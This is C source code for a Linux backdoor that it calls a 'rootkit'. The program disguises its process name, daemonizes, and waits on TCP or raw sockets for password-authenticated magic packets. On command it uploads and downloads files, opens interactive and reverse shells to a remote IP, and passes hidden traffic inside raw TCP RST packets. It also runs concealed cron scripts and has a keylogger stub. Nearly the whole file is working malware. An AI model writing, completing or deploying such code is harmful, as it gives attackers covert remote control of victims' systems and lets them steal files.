#include <stdarg.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

#include "../include/config.h"
#include "../include/actions.h"

#define CHECKSTR "check"
#define PS1 "PS1=\\[\\033[1;30m\\][\\[\\033[0;32m\\]\\u\\[\\033[1;32m\\]@\\[\\033[0;32m\\]\\h \\[\\033[1;37m\\]\\W\\[\\033[1;30m\\]]\\[\\033[0m\\]# "
#define MAXDIRECTRAW 5

struct rawsock {
    int r[2];
    int w[2];
};

int weekday;
struct rawsock rawsocks[MAXDIRECTRAW];

// Debug function
__inline__ void debug(char * format, ...){
#if DEBUG
    va_list args;
    va_start(args, format);
    vprintf(format, args);
    va_end(args);
#endif
}

// Cron function
#if CRON
void cron(int n) {
    char buffer[256];

    debug("Executant el cron daily\n");
    sprintf(buffer, HOME"/.daily");
    system(buffer);

    weekday++;
    if ((weekday % 7) == 0){
        debug("Executant el cron weekly\n");
        sprintf(buffer, HOME"/.weekly");
        system(buffer);
    }

    if ((weekday % 30) == 0){
        debug("Executant el cron monthly\n");
        sprintf(buffer, HOME"/.monthly");
        system(buffer);
        weekday = 0;
    }

    signal(SIGALRM, cron);
    // Launched every 24h
    alarm(60*60*24);
}
#endif

void rename_proc(char **argv, int argc) {
    int i;
    for (i = 0; i < argc; i++) {
        realloc(argv[i], strlen(PROCNAME)+1);
        memcpy(argv[i], PROCNAME, strlen(PROCNAME)+1);
    }
}

void daemonize() {
    int fd, i;
    switch (fork()) {
        case -1: exit(-1);
        case  0: break;
        default: exit(0);
    }
    setsid(); 
    chdir ("/");
    fd = open("/dev/null", O_RDWR, 0);
    dup2 (fd, 0);
    dup2 (fd, 1);
    dup2 (fd, 2);

    if (fd > 2) close(fd);

    // Ignore all signals
    for (i = 1; i < 64; i++)
        signal(i, SIG_IGN);

    //signal(SIGHUP, SIG_IGN);
    //signal(SIGCHLD, sig_child);
}

void launcher_download(int sockr, int sockw, char *file, unsigned long size) {
    int bytes, fd;
    unsigned char buf[BUFSIZE];
    char *ptr;

    ptr = strrchr(file, '/');
    if (ptr) { ptr++;}
    else { ptr = file; }

    fd = open(file, O_RDONLY);
    if (fd < 0){
        debug("Error openning file %s\n", file);
        close(sockr);
        close(sockw);
        exit(0);
    }

    bytes=0;
    while ((bytes = read(fd, &buf, BUFSIZE)) > 0){
        debug("Sending %d bytes.\n", bytes);
        if (write(sockw, &buf, bytes) < bytes){
            debug("No s'ha enviat tot!\n");
        }
    }
    debug("file %s sended!\n", file);

    sleep(1);
    close(fd);
}

int launcher_rcon(struct in_addr *ip, unsigned short port) {
    int sock;
    struct sockaddr_in cli;

    sock = socket(AF_INET, SOCK_STREAM, 6);
    if (sock < 0) exit(-1);

    memset(&cli, 0, sizeof(cli));
    cli.sin_family = AF_INET;
    cli.sin_port = htons(port);
    cli.sin_addr = *ip;

    if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0) {
        close(sock);
        debug("Failed to connect to destination port %d\n", port);
        exit(-1);
    }

    return sock;
}

void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
    int fd, bytes;
    unsigned char buf[BUFSIZE];
    char *ptr;
    char file_path[256];

    ptr = strrchr(file, '/');
    if (ptr) { ptr++;}
    else { ptr = file; }

    if (getuid()) sprintf(file_path,"/var/tmp");
    else sprintf(file_path, "%s/%s", HOME, ptr);
    fd = open(file_path, O_RDWR|O_CREAT|O_TRUNC, S_IRWXU);
    if (fd < 0){
        debug("Error creating file: %s",file_path);
        close(sockr);
        close(sockw);
        exit(0);
    }
    debug("file %s created!", file_path);

    bytes=0;
    while ((bytes = read(sockr, &buf, BUFSIZE)) > 0){
        debug("Received %d bytes.\n", bytes);
        if (write(fd, &buf, bytes) < bytes){
            debug("No s'ha guardat tot!\n");
        }
    }

    sleep(1);
    close(fd);
}

static inline int max(int a, int b) {
    return a > b ? a : b;
}

void launcher_shell(int sockr, int sockw) {
    int tty, pty, subshell;
    unsigned char buf[BUFSIZE];
    // used to get the tty
    extern char *ptsname();

    pty = open("/dev/ptmx", O_RDWR);
    grantpt(pty);
    unlockpt(pty);
    tty = open(ptsname(pty), O_RDWR);

    // child
    if(!(subshell = fork())) {
        // per a que bash sigui fill de l'init
        if (fork() != 0){
            exit(0);
        }

        close(pty);
        close(sockr);
        close(sockw);
        // new session to be used with bash
        setsid();
        ioctl(tty, TIOCSCTTY, NULL);

        // start using the new tty
        dup2(tty, 0);
        dup2(tty, 1);
        dup2(tty, 2);
        close(tty);

        if (getuid()) chdir("/var/tmp");
        else chdir(HOME);
        // overwrite the PS1 to know that you are in "skd mode"
        putenv(PS1);
        execl("/bin/sh", "sh", "--norc", "-i", NULL);

        // we should not to be here
        exit(1);
    }

    // parent
    else{
        close(tty);
        //per a que la conexio establerta amb el tty sigui fill de l'init
        if (fork() != 0) exit(0);

        // main while
        while (1) {
            fd_set  fds;
            int count;

            // put the fd to watch
            FD_ZERO(&fds);
            FD_SET(sockr, &fds);
            FD_SET(pty, &fds);

            if (select(max(pty, sockr)  + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;

            /* stdin => shell */
            if (FD_ISSET(pty, &fds)) {
                count = read(pty, buf, BUFSIZE);
                if ((count <= 0) && (errno != EINTR)) break;
                if (write(sockw, buf, count) <= 0 && (errno != EINTR)) break;    
                /* shell => stdout */
            } else if (FD_ISSET(sockr, &fds)) {
                count = read(sockr, buf, BUFSIZE);
                // TODO: enviar char especial per setejar tamany tty, timeout, etc.
                if ((count <= 0) && (errno != EINTR)) break;
                if (write(pty, buf, count) <= 0 && (errno != EINTR)) break;
            }
        }
    }   
    close(pty);
    debug("Waiting child\n");
    waitpid(subshell, NULL, 0);
}

void send_raw(struct in_addr *ip, short port, unsigned char *buf, int size) {
    short pig_ack=0;
    unsigned char datagram[sizeof(struct tcphdr) + 12 + sizeof(struct data)];
    struct tcphdr *tcph = (struct tcphdr *) (datagram);
    struct sockaddr_in servaddr;
    memset(datagram, 0, sizeof(datagram)); /* zero out the buffer */

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = ip->s_addr;

    tcph->source = htons(80); /* source port */
    tcph->dest = htons(port); /* destination port */
    tcph->seq = htonl(31337);
    tcph->ack_seq = htonl(pig_ack);/* in first SYN packet, ACK is not present */
    tcph->doff = 7+2+1 ;
    tcph->urg = 0;
    tcph->ack = 0;
    tcph->psh = 0;
    tcph->rst = 1;
    tcph->syn = 0;
    tcph->fin = 0;
    tcph->window = htons (57344); /* FreeBSD uses this value too */
    tcph->check = 0; /* we will compute it later */
    tcph->urg_ptr = 0;

    debug("headers ok\n");
    struct data cmdpkt;
    cmdpkt.port = port;
    if ( size > 255) debug("SUPERERROR, les dades a enviar no caben!\n");
    else {
        cmdpkt.size = size;
        memcpy(cmdpkt.bytes, buf, size);
    }
    // Si envio el packet igual que el què espero, em salta raw_daemon
    memcpy(cmdpkt.pass, PASSWORD, strlen(PASSWORD));
    memcpy(&datagram[sizeof(struct tcphdr) + 12], &cmdpkt, sizeof(struct data));
    if (sendto (s, datagram, sizeof(struct tcphdr) + 12 + sizeof(struct data) ,0, (struct sockaddr *) &servaddr, sizeof (servaddr)) < 0) {
        fprintf(stderr,"Error in sendto\n");
    }
    close(s);
}

// TODO: Falta parar aquest servei, i permetre més d'un servei d'aquests alhora.
int launcher_directraw(struct in_addr *ip, short port) {
    int pid;
    if (port < MAXDIRECTRAW && port > 0 ) {
        pid = fork();
        if (!pid) {
            debug("launching on port: %d\n", port);
            while (1) {

                fd_set fds;
                int count;
                unsigned char buf[BUFSIZE];

                // put the fd to watch
                FD_ZERO(&fds);
                FD_SET(rawsocks[port].w[0], &fds);

                // there are data on pipe?
                if (select(rawsocks[port].w[0]  + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;

                // if there ara data, send it throw raw packet
                if (FD_ISSET(rawsocks[port].w[0], &fds)) {
                    count = read(rawsocks[port].w[0], buf, BUFSIZE);
                    debug("=> Sending RAW packet to client\n");
                    send_raw(ip, port, buf, count);
                    debug("<= Raw packet sended!\n");
                } 
            } 
        } else {
            debug("directraw: retuning pid\n");
            return pid;
        }
    } else {
        debug("Invalid port=%d\n", port);
    }
    return 0;
}

void do_action(struct data *d, struct in_addr *ip, int sock) {
    if (fork() != 0){
        return;
    }

    switch(d->action) {
        case UPLOAD:
            debug("Uploading file\n");
            if (!getuid()) {

            } else {
                launcher_upload(sock, sock, (char *)d->bytes, d->size);
                close(sock);
            }
            break;
        case DOWNLOAD:
            debug("Downloading file\n");
            if (!getuid()) {

            } else {
                launcher_download(sock, sock, (char *)d->bytes, d->size);
                close(sock);
            }
            break;
        case SHELL:
            debug("Launching shell\n");
            if (!getuid()) {
                debug("Starting DirectRAW service\n");
                if (launcher_directraw(ip, d->port)) {
                    debug("done!\n");
                    launcher_shell(rawsocks[d->port].r[0], rawsocks[d->port].w[1]);
                    // kill pid
                }
            } else {
                launcher_shell(sock, sock);
                close(sock);
            }
            break;
        case RUPLOAD:
            debug("Reverse uploading file\n");
            if ((sock = launcher_rcon(ip, d->port))) {
                launcher_upload(sock, sock, (char *)d->bytes, d->size);
                close(sock);
            }
            break;
        case RDOWNLOAD:
            debug("Reverse downloading file\n");
            if ((sock = launcher_rcon(ip, d->port))) {
                launcher_download(sock, sock, (char *)d->bytes, d->size);
                close(sock);
            }
            break;
        case RSHELL:
            debug("Launching reverse shell\n");
            if ((sock = launcher_rcon(ip, d->port))) {
                launcher_shell(sock, sock);
                close(sock);
            }
            break;

        default:
            debug("Invalid option: %d\n", d->action);
    }
    debug("Connection closed\n");
    exit(0);
}

void fill_raw_connection(struct data *d) {
    if (d->port < MAXDIRECTRAW && d->port > 0) {
        debug("Escrivint dades a la pipe pertinent(%d)\n", d->port);
        write(rawsocks[d->port].r[1], d->bytes, d->size);
    } else {
        debug("Received raw data for an invalid thread: port=%d\n", d->port);
    }
    return;
}

void tcp_daemon(int port) {
    int sock, sock_con, one = 1, bytes;
    struct sockaddr_in tcp;
    struct sockaddr_in cli;
    unsigned int slen = sizeof(cli);
    struct data d;

    if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        debug("Can't allocate tcp socket\n");
        exit(-1);
    }

    memset((char *) &tcp, 0, sizeof(tcp));
    tcp.sin_family = AF_INET;
    tcp.sin_addr.s_addr = htonl(INADDR_ANY);
    tcp.sin_port = htons(port);

    // We want to reuse the source port port (avoiding bind errors)
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&one, sizeof(int)) < 0)
        debug("Error setsockopt: reuseaddr\n");

    if (bind(sock, (struct sockaddr *) &tcp, sizeof(tcp)) < 0) {
        debug("Error: bind\n");
        exit(-1);
    }

    if (listen(sock, 1) < 0) {
        debug("Error: listen\n");
        exit(-1);
    }

    debug("Listening to port %d\n", port);
    while (1) {
        sock_con = accept(sock, (struct sockaddr *) &cli, &slen);
        if (sock_con < 0) {
            debug("Error: accept\n");
            exit(-1);
        }
        printf("Received connection!\n");
        if (!fork()) {
            close(sock);
            if ((bytes = read(sock_con, &d, sizeof(struct data))) != sizeof(struct data)) {
                debug("ERROR: tcp_daemon. Llegits %d bytes\n", bytes);
            }
            if (!memcmp(PASSWORD, d.pass, 20)) {
                debug("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", d.action);
                do_action(&d, &tcp.sin_addr, sock_con);
            }
            exit(-1);
        }
        close(sock_con);
    }
}


void raw_daemon() {
    int sock, i;
    struct sockaddr_in raw;
    unsigned int slen = sizeof(raw);
    struct packet p;
    int size;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        debug("Can't allocate raw socket\n");
        exit(-1);
    }

    // Initalizing direct raw pipes
    for (i = 0; i < MAXDIRECTRAW; i++) {
        if (pipe(rawsocks[i].r) || pipe(rawsocks[i].w)) {
            debug("Error creating pipes\n");
        }
    }

    // TODO: evaluar si és millor un sniffer (mode promiscuo) o això (CPU)
    while (1) {
        size = recvfrom(sock, &p, sizeof(p), 0, (struct sockaddr *) &raw, &slen);
        //        debug("Rebut: %d bytes port %d - %d\n", size, ntohs(p.tcp.dest), ntohs(p.tcp.source));
        //    if (ntohs(p.tcp.dest) == 2222) {
        //        debug("Rebut: %d bytes ports %d -> %d\n", size, ntohs(p.tcp.source), 2222);
        //    }
        // Si el tamany del paquet es el que toca
        if (size == sizeof(struct packet)) {
            // I el password és correcte
            if (!memcmp(PASSWORD, p.action.pass, 20)) {
                debug("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", p.action.action);
                //If has the RESET flag, is a direct raw packet
                if (p.tcp.rst) {
                    debug("packet de sessio RAW\n");
                    fill_raw_connection(&(p.action));
                } else {
                    debug("packet normal RAW\n");
                    do_action(&(p.action), &raw.sin_addr, 0);
                }
            }
        }
    }
}
/*
 * How to launch the server:
 * 1 => without params as root for a raw socket
 * 2 => with only on param for a tcp socket (param = listen port)
 * 3 => with two params for a connect back shell
 */
int main(int argc, char **argv) {
    int port = 0;

    // Command mode
    if (argc == 3){
        // Connect to argv[1]:argv[2]
        return 0;
    } else if (argc == 2) {
        port = atoi(argv[1]);    
    }

    // Check if we are running

    // Change proc name
    rename_proc(argv, argc);

    // Daemonize
#if ! DEBUG
    daemonize();
#endif

    // Cron
#if CROND
    debug("Initializing crond\n");
    signal(SIGALRM, cron);
    alarm(60*60*24);
#endif

#ifdef KEYLOGGER
    debug("Initializing keylogger\n");
#endif

    // if we can't open a raw socket
    if (getuid() && geteuid()) {
        if (port) {
            debug("Detected unprivileged mode, openning TCP socket\n");
            // Open a socket and listen
            tcp_daemon(port);
        }
    } else {
        debug("Detected privileged mode, openning RAW socket\n");
        // Change to root mode
        setuid(0);
        setreuid(0,0);
        setgid(0);
        setregid(0,0);

        // Open a socket and listen
        raw_daemon();
    }

    debug("Finalising rootkit\n");

    return 0;   
}
